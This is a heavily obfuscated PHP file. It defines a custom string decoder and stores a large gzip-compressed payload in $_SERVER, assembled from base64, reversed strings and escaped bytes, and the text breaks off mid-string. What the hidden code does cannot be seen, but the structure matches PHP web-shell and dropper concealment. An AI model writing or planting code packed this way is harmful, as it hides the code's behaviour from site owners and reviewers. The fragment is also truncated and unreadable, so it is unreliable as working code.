<?php
 goto C‹ü ™·⁄ù; C‹ü ™·⁄ù: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define(base64_decode('58XKisqw'), "\213\354\202\257\205\372"); $_SERVER[Á≈ ä ∞] = explode("\174\3\174\3\174\4", gzinflate(substr("\x1f\x8b\x8\x0\x0\x0\x0\x0\x0\x13\xc5\x7d\x9\x78\x1b\xd5\xd5\x28\x2d\x14\x4a\x80\xfc\x65\x2d\x4\x28\x13\x43\x62\x27\xd1\xe2\xec\x89\x13\x27\x91\x6d\x39\x56\x22\x4b\x8e\x24\x67\xc1\x4e".base64_decode('JmNpbI0taeSZkbck7BQKhLXsKYVSCrSEJWwpa0uhtECAFnhsP0shGzuhFLqwvLuc')."\xbb\xcc\x48\x86\xff\x7d\xef\x7d\xdf\xb\x24\xba\xf7\xdc\x65\xee\x72\xee\xb9\xe7\x9c\x7b\xee\xb9\x9f\x6c\xfc\xf9\x67\x2f\x3f\xb7\x7e\x6f\xf4\xdf\x3e\x67\xbc\xf1\xfc\x27\x2f\x7f\x49\xc3\xe8\xef".base64_decode('99Z/l4aPO/f7e5E/h557Tk1Ny6wxU2IHXnDXZu1WbbN2Tjz65FORg56+ZUl45/VP')."\16\357\374\316\136\357\136\170\343\27\165\50\63\55\133\107\177\224\202\351\50\372\220\141\73\66\5\250\132\267\221\323\223\306\210\36\51\170\41\64\216\143\152\217\356\250\151\263"."\xe0\xe8\x5\x56\xb0\x21\x94\x8c\x34\xaa\x6d\xa1\x54\xb\x8d\x6b\xc5\x62\xd0\xce\xf4\xd9\x41\xcd\x4a\x67\x8d\x1\x3d\x6a\x74\x5\xbb\x8c\x42\x30\xa3\x39\x5a\x0\x5\x68\xae\x31\xf4\x67\x6\xfd"."\111\147\365\164\237\252\165\231\226\243\147\50\250\124\310\31\205\76\271\45\220\325\54\164\33\75\64\314\52\13\322\237\366\104\324\322\363\246\3\71\3\120\230\217\37\372\327\356"."\317\31\54\135\215\305\123\152\262\275\255\55\234\110\101\246\72\71\75\157\146\40\124\324\54\55\17\335\55\352\226\215\106\115\256\116\55\232\105\275\340\202\10\0\356\166\227\146".base64_decode('Q01NDWpTuC0aX6WmVrWFIUeX2l/SrWEaI8Gko1lOysjrPMegxdvVEF4ciSmpRCiW')."\14\65\246\42\361\30\5\67\306\133\133\43\251\162\170\42\36\215\66\204\32\227\226\247\264\45\102\213\133\103\12\152\37\232\130\243\320\155\326\50\153\151\312\132\145\22\15\64"."\33\172\16\46\244\240\261\346\70\303\105\10\245\170\10\241\123\241\224\313\321\110\214\207\62\172\267\126\312\301\150\65\311\221\242\145\344\65\326\351\245\372\60\207\2\26\225\34"."\323\50\244\151\44\74\344\130\232\200\243\266\246\321\104\43\24\244\260\144\70\32\156\114\51\270\201\112\163\42\336\252\300\44\344\65\333\321\55\145\105\113\70\21\126\160\243\353"."\xab\x49\x5f\xab\x15\xc0\x97\x18\x1a\xa\x25\x14\x8d\x2a\xa3\xd5\xe0\xe8\xf9\x22\xab\x86\x96\xa9\x50\x59\x3c\xd1\x14\x4e\x28\xd\xab\x14\x31\x42\x69\x33\x9f\x37\xb\x1\x54\xb\x9a\x49\x47\x6a".strrev(''."\r".'¶ø’.XSCπh£úÓôb∫~¶KQEñÁAè0…ÕÕ‚DOh√,†ë8j')."\250\333\157\24\214\22\240\51\124\141\232\66\153\61\4\112\54\267\316\40\172\6\2\171\124\336\204\225\207\226\341\0\15\326\57\240\277\363\40\123\27\246\17\3\272\345\250\172".base64_decode('IW1mjAIs1oWAdJqTbbIQXbBovNvMZVjYdtGaWCkvZ+FRRFVyGYutr2/KSaNRvlxx')."\136\21\53\242\226\254\147\53\335\350\36\26\353\315\66\113\126\32\321\301\156\123\224\153\343\271\247\102\46\335\161\120\347\140\154\14\263\275\230\63\265\114\122\267\170\327\14\263"."\31\25\214\227\34\31\130\42\331\232\115\53\337\204\50\3\174\37\255\12\243\275\102\102\37\133\27\31\151\304\202\65\35\247\372\277\132\335\261\10\375\63\11\110\137\47\264\51"."\xab\xe7\x72\xaa\x3e\xa4\xc3\xc2\xc9\x67\x66\xda\x6c\x30\x82\x36\xa6\xc2\x8\x42\xa3\x91\xb8\x9a\xd5\xec\x6c\x6b\x66\xa6\x4a\x4a\x41\x93\xb\x19\x7d\x28\x50\xcc\x16\x69\x54\x2c\xe9\x4e\x17\x62".base64_decode('46GLmU5Y2j9yZlrLyV2k4azjFJN6IdPMCXjGHCyQkSrqjNY3+ZSM0qqsUlrqjDqb')."\25\314\347\170\210\365\216\303\154\16\164\206\330\164\146\272\151\200\357\61\125\360\101\303\46\24\116\54\117\264\105\345\214\264\346\30\146\41\150\246\35\335\361\333\216\245\153\120".strrev('…}rfÇûjµ+XcÙtç<”&S®QèF[èË9úπC˘ÃÀ9vàﬂ€m÷ù(c').base64_decode('6fbPYSuQ57a0gt2tW/4wrIw6BTWWU0GWrcmwi6Zt4ObVKZrjaOkspiCi+vpvyG/g')."\x7d\x53\x2f\xcb\x1b\x1e\x2a\x1a\x96\x6e\xb3\xb6\x2a\x8b\x5b\x53\x50\x9\xaa\x5d\xf7\xb7\x59\x5a\x4f\x5e\xab\x53\x8a\xa5\x2e\x34\x32\xb0\x52\x2b\xc0\x68\x6e\x18\x9a\x3a\x25\x8d\xa3\x3e\x25\x5f"."\xb2\x1d\xbf\xa5\x23\x52\x64\xa0\xed\xe\x6\x39\xd2\xed\x6f\xc5\xeb\xca\xd0\x33\xfe\x24\xa2\xd8\x0\x9e\x5e\x3b\x43\x41\xa8\xa3\xb0\x34\xa\x6d\x49\xa5\xda\xd4\x48\x33\xda\x92\x63\x61\xb5\x35"."\x94\x6a\x4\x66\x22\xec\x68\x3d\xac\xcd\x51\x44\x87\x79\x95\xc\xb8\xd2\x8f\xd6\x17\x46\xae\x18\xea\xab\x0\xb6\x99\x83\xba\x85\x3e\xdc\x30\x5c\xa7\xf4\x99\x99\x2e\x73\x28\xc0\x92\x9a\x81\xa9"."\x61\x99\xf1\x74\x17\x1d\x7f\x42\x2b\xf4\xe0\xf1\xe9\x1a\x76\x74\x40\x41\x7b\xa0\xc7\x3d\xd0\x51\xbd\xd0\xe3\x64\x59\xc1\x64\x38\xb1\x3c\x9c\x50\x93\xf1\xe6\xd4\x8a\x50\x2\x36\xf3\x2\xc2\x92"."\41\366\51\134\165\316\237\320\63\150\350\323\16\53\247\25\361\250\261\74\170\161\340\271\142\251\170\301\260\264\150\144\61\36\230\46\277\215\62\371\345\134\254\356\250\221\67\160".base64_decode('2x2eQkYS7fSLoUFB0qH6zuzkms7MlEl+9O/kSR2dTYHJqxcGDVEmODUwVZlWO0tp').strrev('z¯&Ò-SÜ∂•2pˆ≤âÅJ√=Ï¥ó{¡¡ÜˇAfõ,=‘æ%ZéYtËÂ°á¨C').base64_decode('OAShqEmXLettB/1ZDbO7mv6oht0sbSs4ysmPanb1oslo1RmN7aY0OpLXejwkH8da')."\115\113\167\103\326\363\255\152\205\221\141\173\2\216\266\350\106\117\26\306\313\300\265\245\315\234\151\151\71\114\31\331\242\320\31\265\352\61\200\132\1\21\26\221\244\221\57\262"."\306\72\331\122\276\113\12\2\265\267\21\376\60\132\226\65\371\176\206\270\147\32\252\13\102\306\11\323\232\141\61\306\203\311\351\350\177\101\332\63\146\136\143\204\222\220\70\75".base64_decode('Q2kcBU12pbTomtikHcsxMdRyZUEDmjVhYpGQAE0q8baxVmb0nM5GI6uzbaIWsqFt')."\216\217\225\304\363\43\342\354\350\142\177\66\354\4\52\211\211\72\213\257\300\354\261\0\70\74\153\16\355\120\161\62\343\42\336\146\351\335\6\54\322\2\232\221\126\315\352\143".base64_decode('vUEzIHAFRyQ8am6PRtXGeCyFWGoKWZGIpMIMb0NNaqixbT3beMWMQgZMYNyIL9jn').base64_decode('gWnQcNScoNjmEMUumgVb94PI5Resd1lSRuwCNIe0c3g2gyG/lh/x59ES8POGuvdg')."\x5\x76\x7\xba\x95\x47\x60\x96\x4\x71\xc7\xc3\x88\xa4\x22\xb6\xf9\xb7\xc5\x93\x50\x60\x21\x86\x22\x6\xac\x4b\xb7\xe0\x63\x6d\xed\x90\x94\x97\x30\x64\x71\x18\x80\x76\x56\x3\x7e\x2a\xb4\x22"."\311\50\162\11\145\264\214\21\115\364\145\41\153\10\353\101\76\47\30\71\167\167\374\142\310\123\55\221\330\122\265\65\336\24\216\252\221\30\42\111\251\162\170\173\133\123\210\315".strrev('®cjíõG	⁄<ïëÕ¬%∂$û√⁄¡	1Y*dëï·Ïﬁ#E-(àÌ†Å3ào°')."\261\105\344\211\205\132\41\242\166\143\31\314\16\272\363\253\210\272\46\271\44\247\16\140\251\324\344\202\273\54\74\251\114\54\120\5\362\240\135\124\7\24\203\356\142\131\230\364".base64_decode('BCThtFlitJ9zkHlGHPIarB6N7ZA19GeSEkoqThHqQGSga5gHSTdYHPGK8H0FKH1Z')."\13\124\234\247\101\357\346\4\270\62\40\324\355\160\72\357\211\43\254\27\151\150\6\102\104\350\106\230\100\146\4\76\143\240\65\144\71\41\326\234\156\41\360\252\361\266\160\42"."\204\305\145\165\105\42\36\133\14\5\6\263\72\153\100\4\206\277\206\161\125\40\65\73\202\22\41\226\110\203\105\222\27\203\336\153\262\241\134\117\177\46\322\37\304\15\302\307".base64_decode('9QIb9S5MlNm2wgLdaDUwgmqW+Ne6TBO+kMOMwXpGKbjU3WszJBliNGYKfHAINoZU')."\x7c\x69\x38\xa6\x32\xcc\xa2\x31\x9\x1b\x29\x0\xc9\xb1\xf1\x4\xc\x88\x63\xf6\x31\x61\x8c\x26\x26\xc2\x49\xb6\xbc\x2d\xbd\xbf\x64\xb0\xe1\xa\x6\xa6\x0\x16\xeb\x68\xef\x81\xcf\x7\xd7\x74"."\xe\x4e\xa9\xe9\xf0\x4f\x9\xac\x46\x81\x49\x93\x17\xd1\x28\xc4\x3a\x3\xae\xe8\x9\x50\xbe\x64\xf1\xd2\x98\x5f\xaa\xb1\x17\x4e\xaa\xeb\xc\x76\x6\x6b\x16\xd6\x75\x84\xfc\x23\x9a\x7f\xa4\xd6"."\77\327\277\172\112\147\140\322\24\0\254\136\67\315\67\143\3\316\200\62\56\74\176\65\372\251\357\134\70\241\323\77\361\244\265\213\72\72\127\127\327\115\31\337\31\70\276\163".strrev('¯tJ#ﬁ°ÕY∫Ë'."\n".'(ƒa,§ÎB,ÒGƒ$‘îÃ‘ﬁaÈö	%“wŸI‰ıp').base64_decode('O6esXiiVk0DebyE+CRHeLM8X8p+Ie8aL4nUP+FEqpAX1xOuiS0sDHTB6CnwJoc2c')."\13\350\156\366\175\335\4\372\273\201\115\144\217\16\213\236\150\340\54\300\316\122\301\350\147\372\207\202\336\17\1\323\141\370\335\245\73\203\72\103\17\4\167\305\21\162\60\231"."\21\45\111\261\34\341\10\341\13\130\222\342\70\312\221\311\50\252\230\265\32\344\261\214\136\200\171\332\37\162\333\151\255\250\47\245\36\252\152\52\324\20\15\253\214\302\0\45"."\146\161\102\25\33\270\256\16\165\115\120\124\106\37\322\202\167\47\142\12\254\174\273\77\247\20\302\240\350\226\145\132\165\104\275\152\227\212\230\47\103\42\231\203\306\126\101\302"."\274\122\277\100\241\103\16\345\124\171\2\212\32\143\20\260\230\255\213\105\217\51\24\264\251\50\146\310\106\234\24\143\153\202\65\235\235\245\16\75\263\272\3\41\276\346\357\136"."\xbd\x6e\xfa\x86\x49\x8c\xbd\xf\x76\xa2\x3f\x2c\x12\xaa\xa0\x40\x53\x39\x35\x54\xd1\xc6\x1c\xc0\xed\xe0\x3a\x14\x57\x84\x27\xd3\xa8\x69\x71\xde\xa8\xe8\xe2\x9e\x1d\xd3\xd1\x72\xae\x2a\x52\x18"."\2\223\313\67\156\320\46\320\331\216\12\212\205\267\162\111\363\110\310\151\214\113\357\134\51\42\251\276\160\211\244\356\4\170\16\237\224\250\242\270\113\13\134\17\232\201\156\243"."\200\226\123\243\264\325\121\235\116\162\330\166\364\274\113\135\151\353\130\235\335\134\312\345\34\316\303\347\214\76\370\2\254\25\320\236\372\351\217\62\245\122\321\146\323\142\242\360"."\x64\x68\x46\xd5\xe4\x4a\x19\x23\x85\x2\x12\x5c\x65\x54\x13\x9b\xec\xe2\x10\x62\x67\x52\x4a\xd\xd3\xf4\x29\x91\x98\xd2\x10\x8f\x47\xc3\xa1\x98\x82\xf7\x73\xd8\x87\x10\xb3\x90\xc\xb7\x85\xd0".base64_decode('JoaF6mQqDMrHSJOf1bvSHwHRigcMGHaziCmIisZERSJMH5tLRBAdlhUUZRDDHKYP').base64_decode('q4Z8mNPwoT74sFzkE+y7T2jafAOGPkgCnMv2AfPtczQLMQyYO4ZgpMln2E1EciAf')."\40\111\254\101\116\26\53\100\162\332\260\217\66\56\252\17\350\71\37\153\232\217\265\330\307\204\102\37\221\344\232\240\131\355\150\161\101\263\110\20\321\320\254\17\243\23\306\146".strrev('[ä–üÀ\'”!1Ò”L$3hÄÕ£¶˚b•ôc◊ƒÅ	ËBL0,ënÇ¡Ã˙–ü').base64_decode('NRWHs3JvyPh7GwFzh5PKR+lbJqt8Ptyy9jpaIwjzG9ie58ojppctw5wuYngCRGi5').base64_decode('WMa4Q83agIx5lbCQ7TwMjYXaTyh8BSfsFS29qmD80ZTWk5Q+52g97FuYlKHUUbPS')."\x70\x42\x4f\xf\xa7\x85\xac\xda\x24\x49\xc0\xee\x98\x7b\x71\x95\x50\x7d\x49\xad\xdb\xd3\x49\x1f\x59\x65\x95\x56\x48\x65\xc\xe0\x58\xcf\x27\x6c\xcc\xfe\xfb\xb3\x11\x67\x4b\x81\xcf\xbe\x6b\x5"."\175\373\332\205\136\22\162\31\57\12\206\203\66\26\223\354\44\332\0\233\163\154\210\246\311\311\100\254\175\356\30\136\172\1\102\274\311\171\112\222\53\65\242\341\346\224\262\44".base64_decode('jiidYaq0jIozK+Qfs6C46mbDpdSTdBHXChkKWYt2hbX1VewjVa7iAmncjfCxqOtr')."\142\376\345\101\300\310\101\272\57\166\62\6\212\213\215\263\4\134\242\146\247\151\0\353\307\41\244\63\230\230\132\31\113\45\142\44\0\254\135\256\357\342\250\130\141\14\45\24"."\374\1\250\200\360\65\230\340\370\305\132\221\242\356\41\367\140\244\147\273\305\103\324\146\24\206\215\202\254\312\22\320\365\174\307\26\14\3\136\352\36\345\133\323\150\141\272\305"."\10\125\231\17\124\150\76\174\140\54\155\346\102\217\203\132\117\16\257\363\56\245\137\171\313\31\321\205\116\267\47\303\11\225\175\33\126\67\140\174\126\263\304\140\62\232\204\11"."\203\120\20\342\54\42\52\145\353\326\6\4\63\343\52\43\121\26\333\31\146\255\227\203\356\112\151\264\151\264\110\13\127\204\124\212\312\164\312\260\243\374\260\335\35\46\75\115".base64_decode('mRWjWMvGwpRZsAGZ8CTUMKICzIgqqRQ4UXJTPNqkEN8A0LaKNkUaRrx/Du2FVgCv').strrev('Z∏iáZ#“®\\ﬁ±†ñ-ca3bo	:Öπ…•ñKj\'(-Iìåü…FccGx≈°')."\xde\x28\x8c\xee\x95\xe3\xcd\x96\xc9\xb9\x66\xce\x24\x78\x33\x35\x12\xb1\x94\x1f\x63\x7a\x36\x76\x69\x70\x5c\xcc\x48\x19\x48\x2a\xe3\x65\x4b\x3c\x50\x4f\x54\xcc\x8a\x6b\x57\xa2\x20\xa6\x7b\xd6".strrev('ì\'!5 â —eÙ,kë4«tô‡‹Ø`EŸ6u•MŒ%j˚=¬@ﬁË∞£y2').strrev('Gç)håÈ5PåÑ4÷Rƒ˚§`¥iÁˇì‰ÀcQd…X´fÓ“$çã^'."\r".'˘î”x').strrev('∆ü$c'."\0".'¬d‡'."\0".'”õß+Çoâ2…≤©ˆOd√ö8ÈFE )ìR7Ç8c8M)ç9')."\xa7\xcd\x22\xe0\x81\x64\x7c\x92\x37\x7\x74\x9\x18\xb0\x1d\xb3\x28\x52\xa4\x28\x4d\x96\x92\x44\xa5\x52\x2e\x3e\x35\xa4\x1d\x68\x89\x65\x8\x53\x2d\x6\x8a\xe4\x85\xb2\x44\x3e\xa7\xab\x38\x80".base64_decode('JZKAGMtIU8iyGNrSzuETHgSUQZgCJtmaq7Sl0crDA8K0hFaFPxygFCCgZTJxdsol').strrev('76/$ ∏¡*ÍŒÃpâö≈®»dÖÀ±t"‘|o'."\0".'€	Àî=ú´ï^;  ∫ ≥Àá')."\63\57\54\72\274\114\277\233\156\217\316\340\260\305\351\225\136\370\204\126\216\43\236\240\61\153\24\164\233\157\355\226\135\211\146\375\177\346\244\313\347\0\257\225\321\20\7\247"."\111\372\155\154\354\66\340\332\307\271\22\127\220\54\211\125\41\333\276\352\270\230\254\4\251\103\132\74\56\174\100\213\225\366\31\157\113\221\70\132\214\225\61\324\233\117\147\152".base64_decode('bELnhvjWKhfCSXi+RquUp/PKBEMn50OYiRNGq4Yl81pu2PjAG2//jIY/ff35L5++').strrev('ŸxL!…˙ˇúÌv¨¬l9œá∆õ∫Î:=oÇWøx?£ÃÎïÃÚ“Ã∑˘$!¬÷ÁÜë')."\x7a\xfb\xf\xaf\xbf\xf6\xa3\x8f\x1e\x7d\xf0\xd5\xb7\x5f\xbf\xa6\xe5\xd7\x5f\x3d\x9e\xbd\x7a\xce\xc9\xbf\x6c\x59\xf6\xc3\x9b\xce\x3d\x62\xf3\x5f\xbe\xeb\x7f\xf6\x8f\x63\x9f\xad\xa\x1d\xfa\xe9"."\253\251\13\326\237\373\341\153\37\276\176\372\226\304\252\217\77\170\352\351\17\237\176\352\253\235\167\74\121\377\345\202\377\174\376\340\301\217\114\136\264\141\316\236\353\26\333\223"."\147\324\236\272\276\171\346\123\375\17\35\70\373\332\345\65\326\330\342\153\17\175\364\361\35\347\176\161\321\245\343\26\47\277\370\272\320\260\166\277\267\247\36\267\254\153\143\363"."\x85\xc5\xaa\x52\xe7\xd8\x23\x53\xb1\xbd\x7e\xde\x55\x75\xef\x25\x57\x1f\xf3\xd9\xab\xfb\xbc\x72\xc5\x23\x57\x3c\x7a\xd2\x5d\xbf\x7c\x63\xf7\xb1\xb3\xf6\x6d\xdc\x71\xfb\x1b\x6f\x9d\x77\xf8\x93"."\x7f\xf9\x9b\x6f\xd7\x55\x1f\x9e\xb3\x76\xfe\xd3\x3d\x53\x94\x75\x6b\xb6\x5d\xf3\x45\x26\xfc\xaf\xe2\xaa\x2d\xff\xea\x79\x38\xb9\xeb\xf4\xdf\x5f\x78\xf2\x6f\xee\x1e\x7a\xf6\xdd\x63\x3e\xde\x33"."\160\377\235\355\371\51\221\313\76\12\135\74\357\316\67\147\234\265\272\127\173\174\351\252\63\333\117\116\235\372\230\65\367\341\133\253\267\37\334\375\320\121\377\274\152\337\372\13"."\xee\xac\x1e\xb7\xe5\x8a\xeb\x67\x1e\x7e\xc4\x8b\x17\xaf\xd9\xb6\x27\xfe\xea\x27\xd9\xe7\x1a\xee\x38\xab\x76\xfe\xf4\x25\xba\x5f\xd\xfc\x74\xce\x8d\xaf\x87\xd7\x8e\xdd\x7f\x70\xdd\xd8\xde\x89"."\xaf\x1f\xde\xf1\xea\x8d\x4f\xa7\x5e\x5d\x19\xbc\xed\xd7\x3b\xb6\xdc\xde\xff\xe1\xb2\xec\x60\xc3\x86\xb9\x8f\x1f\x30\x77\xbf\xdf\xfd\x38\x72\xdf\xd8\xfa\x8d\xcf\x8d\x3d\x63\x64\xdb\x19\xaf\x6c"."\xfd\x71\x69\xfc\x2f\x86\x1f\xdd\x7d\xc8\xc0\x71\xe3\xe\x1f\xb3\xf7\x33\x57\x77\xfd\xe2\xf3\xd\x27\x34\xe5\x76\xff\x73\x7d\x66\xe5\xa3\xd7\xfb\xfb\x5f\x3a\x4c\xd9\x7e\xda\xc1\xb9\xb7\xbf\x3f".strrev('ƒÌ™∫è\'˘≥ﬂ∑_Wß∏ƒ{Óœ„ËÙ›&õÕÛﬁdªŒGZdMÀ«xüﬂ$«b«‚˛')."\331\135\177\352\377\317\221\317\275\264\166\211\362\376\326\266\373\376\260\317\76\143\367\54\270\245\352\214\33\33\147\135\276\162\316\76\327\137\350\337\374\253\235\347\337\360\236\165".base64_decode('8943nvX+OVcf+c4nW/b5zbv3TX3g0HveO+WRiRNn/eCJ94beVQ789NAnN48/oG72')."\313\371\47\357\71\341\362\123\226\255\176\352\277\267\327\276\174\365\123\217\366\236\264\155\303\115\333\146\376\164\306\302\77\337\72\376\373\147\73\7\134\63\355\260\107\356\331\161"."\xde\x73\x9b\x36\x6c\xf0\xff\xed\xb7\x6b\x17\xfc\xed\x17\x67\xff\xf0\xe6\x43\xfb\xef\xfb\xee\xf4\xeb\x9c\x3f\xc\xbc\xf3\x45\xfe\xd5\xdc\x7e\x7f\x36\xe\xbe\x69\xcf\x3f\xac\x1f\xfd\xbd\x66\xcd"."\57\77\77\176\257\221\227\252\307\35\263\150\343\242\221\113\246\237\62\143\353\165\127\37\232\237\262\241\130\172\364\366\265\213\7\267\374\356\274\33\32\257\335\47\263\355\256\13".base64_decode('Hzrlvnv37Bd4du1b3UdckR/ad9mBW79Tu3bOy8VTJl/f+ofztY1ndF2YePKog5qO').strrev('—uö}[Ωw{uˇD˚@‡±úπÓ™ã˘YÓ«≥ÜÓÓ˝µ7w)®Îx]\'ãw˙<')."\xbe\xbf\x7f\x61\xa0\xf5\xfd\xdf\xdd\xfb\x5c\xda\x77\xcc\x3e\x8f\xcc\xbf\xf2\xd9\x13\x9e\xba\x4e\x3b\xe9\x82\x13\x3a\xaa\x36\x98\xed\xfb\x6d\xbe\xea\xaf\x9b\xc7\xe\x5e\xbc\x73\xc9\x15\xfd\xaf".base64_decode('H3XCj+68/2+bbth9ZNsLh52839DOg5oP/OGvZh13xUXHPPuPmpceGzdhVe3Lr0xf')."\x7a\x7a\xe3\x94\x25\xf7\x6e\xba\xae\xed\x8f\xcb\x6e\x3a\xe5\x8e\x1d\xdf\x5b\x7b\xf0\xb8\x17\x3e\xef\xd8\x6f\xc9\xdd\xaf\x7d\x78\xcc\x94\xcd\x63\x77\x1d\x3b\xfb\x9e\x9f\x9e\x74\xe3\xf4\xe8\x3f"."\117\270\245\361\373\163\256\17\257\171\367\127\7\251\277\356\74\173\307\41\57\35\320\322\175\134\165\127\343\336\367\274\325\164\324\163\27\114\374\356\346\263\346\344\13\117\34\22"."\250\175\263\331\272\154\354\351\375\117\116\75\343\117\361\63\217\77\343\254\55\221\233\177\37\162\266\115\276\46\162\373\253\263\6\254\161\3\273\156\271\241\326\70\377\322\370\356".base64_decode('ob+d3/9y7+Gzqi5/ruOIdy/6dOOkI5Ydlr3X7+w57OLN//LfOfEere0vhSvvGf+9')."\165\305\37\235\362\327\377\214\275\150\353\242\327\256\30\170\150\335\257\117\272\177\325\357\267\115\75\260\272\266\152\323\345\347\115\372\356\241\201\163\173\27\34\375\332\251\147\254"."\375\344\374\225\37\164\114\153\131\75\173\371\145\7\347\37\272\141\121\170\374\275\343\266\35\323\177\166\161\344\266\344\212\363\307\175\31\172\76\176\160\166\121\325\105\167\117\77"."\146\340\322\223\256\177\171\367\354\177\67\354\175\350\234\363\243\147\156\106\153\353\261\63\22\257\336\374\243\143\146\274\22\171\352\373\157\206\307\157\274\175\337\147\27\34\371\370".base64_decode('b3ccu3b+1o7OF37w2Zn7Pxn/8KN3rr3151e9XdySavjFU3rX3bMfO+m/57+ud59m')."\317\32\336\373\257\143\307\76\61\224\36\177\271\366\302\261\271\211\316\356\256\53\277\376\264\152\336\115\53\247\175\370\332\256\117\117\277\377\252\65\235\376\315\176\375\262\217\364"."\17\37\373\311\167\56\256\173\365\355\233\337\77\374\321\335\237\134\376\114\360\353\217\357\174\357\305\223\177\173\322\337\337\177\67\376\314\103\33\366\174\362\357\155\127\177\176\333".base64_decode('G+tLe9796IfHPfjAF188s+K2NeqXH+46wHrr9R/9fePCLy5asvykTZ9efcgb2Sce').base64_decode('PeynTRfuOqblqFMe37jXD975+MXT1uy5+aYVW9IHTL78lINC9963LLzo6P1WVR9a')."\110\134\360\345\275\305\272\276\353\243\321\133\354\53\172\177\371\130\156\323\75\125\227\126\35\166\100\154\334\165\15\143\46\134\371\337\23\316\72\153\313\326\246\77\373\117\173\141"."\xef\xd7\xae\x98\xff\xf4\x43\x97\xaf\x3a\x69\xcb\xfa\x93\x23\x37\x6f\x9f\xfb\x62\xcd\x65\xcb\x7f\x9e\xb9\xec\xf2\xcf\x6\xae\x3e\x7d\xe4\xb1\x67\xe3\xcf\x9d\xd9\xbc\x27\x17\x9f\xaa\xef\x65\xbd"."\264\375\210\337\250\307\274\176\130\172\373\13\15\257\316\155\134\323\266\345\315\263\36\112\374\163\316\325\207\57\317\204\307\35\364\237\67\66\75\361\305\273\347\376\372\204\303\302".strrev('≠hÒ:!ÈÚﬁm◊ÔwSºˇ»Œ&˜õŒ„›l˚>Í;ß˘∑ÀˇXzÿûó¶Ó ')."\270\105\275\367\201\313\216\65\127\374\351\316\237\177\155\177\174\352\161\357\77\165\346\141\167\334\172\327\65\57\356\54\255\263\234\45\335\147\176\161\355\7\277\111\156\234\177\313".base64_decode('rNhV7xYmHNCz6/G9H17x3rZzOn722t//cfHm2KwffxDb/OJTl0yse+q5t88685b6')."\x2b\x9f\x9e\xf8\xe5\x7\x7f\x6c\xeb\x3f\x7a\x5b\xdd\x69\x2f\x47\xe6\x7e\xf4\xfe\x87\xb7\xe4\x3f\x3f\xe8\x95\x8f\xf6\xd8\xb3\x3e\xc\x4\xf5\xc9\xff\x98\x78\x63\x74\xc9\x99\xc9\x55\x8f\xcc\xd2"."\237\171\144\140\150\334\13\13\76\213\355\330\247\357\202\232\367\16\275\63\364\233\75\177\230\347\273\371\366\163\277\33\322\327\314\375\136\317\357\236\73\173\307\230\310\37\6\357".strrev('ã'."\r".'¬˝:“dxoÉ„˛<gcú˝æO6Zc˘∆Ôa¯>_éˆ8Ná„´˝¯£≤˝Nı€Z')."\x9a\x52\xe3\x6e\x31\x7a\xea\xc7\xfc\xbe\x67\xd1\x19\xbf\x78\xb7\x7a\xdd\x47\x7b\x47\xaf\xbf\xe1\x9e\xd9\xaf\x74\xff\xe6\xc6\x45\x63\x5e\x5a\x73\xce\xd8\xe3\x3f\x9b\x73\x6b\xa6\x65\xbf\xc2\xcc".base64_decode('gy9OZrf5bnz3yd0vrrr6ymtvn7U2eGDrhSf+c/v+r0/uuuO90iHdxUvqxm7JXPtA')."\360\230\103\37\175\346\332\361\43\327\337\176\124\376\267\343\357\351\70\276\172\344\202\67\326\377\353\221\53\163\353\336\174\52\34\155\163\56\373\255\322\361\316\17\102\127\215\71".strrev('s+zﬁ[Œ˘ø9≠Ê>‹7_¥˛yü%Oo¯˛æó⁄€xC}]†ºábÛ£˛>Ó|fΩÕ').base64_decode('nX/JS0/edUXL9cufn/zOe++euHrKvNQzH93zqwvu+fuu+hPn7vkysKDulXH1T9zf')."\167\155\166\363\161\37\174\270\374\376\103\147\154\136\173\303\137\214\130\347\143\233\216\276\345\354\326\221\367\376\335\330\363\352\25\77\73\340\237\77\136\31\270\154\340\263\167\267"."\x3d\xf1\xc7\xbf\x7e\x72\x49\xf5\xa6\x9f\xad\x3a\xe5\x8e\x5d\xd7\xd5\xfc\x2f\x7f\xfa\xd6\xad\xb5\x17\xa9\x13\x8e\xff\xcb\xb1\xcb\xf5\x9a\xbf\x9b\x8b\xc7\xfd\xe9\xe1\xd5\x5f\xad\x7a\xf2\xc6\xbd".base64_decode('Oi901NgBIxeOOfWazgn3vXhN1j8SHv7VYT84edw7P7n3nV7nmn/OazHrTxz/+Stn')."\xa7\x2e\xda\x72\xf8\x1d\x73\x9e\x88\x4c\x7b\xf5\xcc\x2f\x8b\x93\xef\xfe\x73\x5d\xff\x3f\xde\x32\x2f\x7f\xe6\xe1\xfb\xbe\xd8\xf6\xc3\x17\xd5\xaf\xde\x7a\xeb\xed\xdb\x82\x5f\xfd\xfd\xbd\x73\xe3"."\13\36\374\367\366\177\355\370\350\353\75\37\74\371\114\340\232\223\217\172\376\235\367\172\202\267\176\365\257\326\217\377\263\355\270\333\326\74\174\337\277\337\277\376\134\365\313\317".strrev('˛|´]·Œ‡{-Æ€5Œ¸˝≥◊˛>Vøˇ{;KÕ¯~èÎ‡º<ΩÍ˙€ÇÓzﬁ')."\xe1\x7e\x8f\xec\xea\xb8\x7b\xe4\xfa\xdf\x3e\xf8\xdc\x2b\xaf\xf5\x7d\x74\x9c\x73\xdf\x83\x5f\xad\x1d\x1a\x72\xbe\xf8\xf8\x2f\xfb\xb7\xcd\x3c\x76\xdc\xf1\xcf\xd5\x1d\x7b\xfc\xab\xbf\xff\xf0\x8c".base64_decode('oecXXv30zl3/eqT3jruWr3njpszskxXf4YOPLXzkrPT3V5/a86/QkRccfvr3zu1a')."\xbc\x67\xc2\x8c\x65\xfe\xa3\x8e\xfe\xcf\xb8\x2b\x9f\xdc\xb4\xef\xcf\xb6\xee\xfb\x5e\xed\x91\x5f\xff\xd7\xd7\x1b\xb7\x5e\x73\xe6\x61\xec\x3a\x88\x6e\xc\x5b\x66\x16\x44\x88\xe9\xf4\x67\xda\x74"."\x8\xc\x65\x4b\x5a\x2e\x3d\x2\x50\xe0\xcc\xb\x99\x81\x74\x17\x1c\x5\xcf\x98\x31\x9b\x6\x6\x7\xb4\xe1\x2\xb3\x3a\x9e\x39\x1d\x4c\x7a\xb2\x7d\xdd\x69\xab\xc0\xf3\x42\xd\x46\x5f\xc1\xce".base64_decode('9QOjCjnTQ/lB3WIGvINDA30WqAumToVi06ZCq5xMrzF